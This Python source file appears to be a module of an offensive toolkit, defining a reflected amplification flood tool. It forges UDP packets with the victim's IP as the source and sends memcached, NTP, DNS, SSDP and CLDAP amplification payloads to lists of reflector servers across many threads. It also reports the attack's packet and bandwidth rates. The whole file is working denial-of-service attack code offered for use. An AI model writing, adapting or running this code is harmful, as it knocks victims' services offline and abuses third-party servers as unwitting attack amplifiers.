from __future__ import annotations
import os
import random
import socket
import struct
import threading
import time
from fsociety.core.base import tool
from fsociety.core.logger import Log

VECTORS = {
    "memcached": {"port": 11211, "payload": b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n", "ratio": "~51,000x"},
    "ntp": {"port": 123, "payload": b"\x17\x00\x03\x2a" + b"\x00" * 4, "ratio": "~556x"},
    "dns": {"port": 53, "payload": (b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03isc\x03org\x00\x00\xff\x00\x01"), "ratio": "~50x"},
    "ssdp": {"port": 1900, "payload": (b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n"), "ratio": "~30x"},
    "cldap": {"port": 389, "payload": (b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass\x30\x00"), "ratio": "~70x"},
}

@tool("amp", "Reflected amplification flood: memcached, ntp, dns, ssdp, cldap", category="dos")
class Amp:
    @staticmethod
    def build_parser(p):
        p.add_argument("target", help="Victim IP (spoofed source)")
        p.add_argument("reflectors", help="File with reflector IPs")
        p.add_argument("--vector", default="all", choices=["all", *VECTORS.keys()])
        p.add_argument("--threads", type=int, default=16)
        p.add_argument("--duration", type=int, default=120)
        p.add_argument("--pps", type=int, default=0, help="Rate limit PPS per thread")
        p.add_argument("--stats", type=int, default=5, help="Stats print interval")

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2: data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    @staticmethod
    def _build_packet(src_ip: str, dst_ip: str, dst_port: int, payload: bytes) -> bytes:
        sport = random.randint(1024, 65535)
        udp_len = 8 + len(payload)
        udp = struct.pack("!HHHH", sport, dst_port, udp_len, 0)
        pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + struct.pack("!BBH", 0, 17, udp_len)
        chk = Amp._checksum(pseudo + udp + payload)
        udp = struct.pack("!HHHH", sport, dst_port, udp_len, chk)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + udp_len, random.randint(0, 65535), 0, 64, 17, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        ip_chk = Amp._checksum(ip)
        ip = ip[:10] + struct.pack("!H", ip_chk) + ip[12:]
        return ip + udp + payload

    @staticmethod
    def _load_reflectors(spec: str) -> list[str]:
        if os.path.isfile(spec):
            with open(spec, "r") as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        return [s.strip() for s in spec.split(",") if s.strip()]

    @staticmethod
    def _worker(target, reflectors, vector_list, stop_event, counters, lock, pps):
        try: sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError: return
        sent = 0; bytes_out = 0; start = time.time()
        while not stop_event.is_set():
            for vname, vport, vpayload, vratio in vector_list:
                reflector = random.choice(reflectors)
                try:
                    pkt = Amp._build_packet(target, reflector, vport, vpayload)
                    sock.sendto(pkt, (reflector, 0))
                    sent += 1; bytes_out += len(pkt)
                except Exception: pass
                if pps > 0:
                    elapsed = time.time() - start; expected = sent / pps
                    if expected > elapsed: time.sleep(expected - elapsed)
            with lock:
                counters["sent"] = counters.get("sent", 0) + sent
                counters["bytes"] = counters.get("bytes", 0) + bytes_out
            sent = 0; bytes_out = 0
        sock.close()

    @staticmethod
    def run(args, log: Log) -> int:
        if os.geteuid() != 0:
            log.err("raw socket spoofing requires root")
            return 1
        try: target_ip = socket.gethostbyname(args.target)
        except socket.gaierror: target_ip = args.target

        reflectors = Amp._load_reflectors(args.reflectors)
        if not reflectors: return 1

        names = list(VECTORS.keys()) if args.vector == "all" else [args.vector]
        vector_list = [(n, VECTORS[n]["port"], VECTORS[n]["payload"], VECTORS[n]["ratio"]) for n in names]

        log.info(f"Victim: {target_ip} | Reflectors: {len(reflectors)} | Vectors: {', '.join(names)}")
        stop_event = threading.Event(); counters = {}; lock = threading.Lock(); threads = []
        
        for _ in range(args.threads):
            t = threading.Thread(target=Amp._worker, args=(target_ip, reflectors, vector_list, stop_event, counters, lock, args.pps), daemon=True)
            t.start(); threads.append(t)

        last_sent = 0; last_bytes = 0; last_ts = time.time(); start = time.time()
        try:
            while time.time() - start < args.duration:
                time.sleep(args.stats)
                with lock: sent_now = counters.get("sent", 0); bytes_now = counters.get("bytes", 0)
                dt = time.time() - last_ts
                pps = (sent_now - last_sent) / dt if dt else 0
                bps = (bytes_now - last_bytes) / dt if dt else 0
                log.info(f"PPS: {pps:,.0f} | Out: {bps * 8 / 1e6:.2f} Mbps | Total: {sent_now:,}")
                last_sent, last_bytes, last_ts = sent_now, bytes_now, time.time()
        except KeyboardInterrupt: log.warn("interrupted")

        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        log.ok("Finished.")
        return 0
